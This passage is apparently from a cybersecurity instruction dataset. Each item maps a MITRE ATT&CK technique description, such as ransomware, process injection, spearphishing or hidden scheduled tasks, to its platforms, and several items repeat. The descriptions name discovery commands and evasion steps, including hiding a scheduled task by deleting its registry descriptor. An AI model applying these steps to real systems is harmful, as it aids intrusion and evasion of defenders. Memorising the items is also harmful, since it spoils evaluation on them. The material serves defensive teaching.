      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "answer": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection (T1055);\nTechnique Process Injection (T1055) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "answer": "The provided description is related to MITRE technique Process Injection (T1055);\nTechnique Process Injection (T1055) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.",
    "context": "",
    "output": "The provided description is related to MITRE technique Valid Accounts: Cloud Accounts (T1078.004);\nTechnique Valid Accounts: Cloud Accounts (T1078.004) is applicable to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.",
      "answer": "The provided description is related to MITRE technique Valid Accounts: Cloud Accounts (T1078.004);\nTechnique Valid Accounts: Cloud Accounts (T1078.004) is applicable to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002);\nTechnique Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002);\nTechnique Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
    "context": "",
    "output": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "answer": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
